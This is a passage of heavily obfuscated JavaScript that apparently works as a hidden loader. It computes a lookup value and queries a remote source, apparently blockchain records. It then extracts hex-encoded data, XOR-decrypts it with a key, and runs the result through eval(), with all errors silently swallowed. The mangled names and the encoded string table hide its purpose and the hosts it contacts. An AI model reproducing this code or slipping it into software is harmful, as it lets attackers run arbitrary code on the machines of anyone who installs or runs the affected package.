__jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
